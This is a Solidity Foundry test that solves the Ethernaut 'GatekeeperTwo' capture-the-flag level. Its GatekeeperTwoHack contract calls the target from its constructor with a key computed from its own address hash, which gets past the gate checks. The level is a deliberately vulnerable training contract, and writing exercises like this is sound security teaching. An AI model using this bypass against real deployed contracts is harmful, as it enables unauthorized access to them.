// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "levels/GatekeeperTwo/GatekeeperTwo.sol";
import "levels/GatekeeperTwo/GatekeeperTwoFactory.sol";
import "./utils/EthernautTest.sol";

contract GatekeeperTwoHack {
    GatekeeperTwo public victim;

    constructor(address _targetAddress) {
        victim = GatekeeperTwo(_targetAddress);
        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max);
        (bool success,) = address(victim).call(abi.encodeWithSignature("enter(bytes8)", _gateKey));
        require(success);
    }
}

contract GatekeeperTwoTest is Test {
    function test_gatekeepertwo() external {
        // Setup
        EthernautTest ethernautTest = new EthernautTest();
        GatekeeperTwoFactory gatekeeperTwoFactory = new GatekeeperTwoFactory();
        address levelAddress = ethernautTest.setup(gatekeeperTwoFactory);

        // Exploit
        vm.startPrank(tx.origin);
        new GatekeeperTwoHack(levelAddress);
        vm.stopPrank();

        // Submit
        ethernautTest.submit();
    }
}
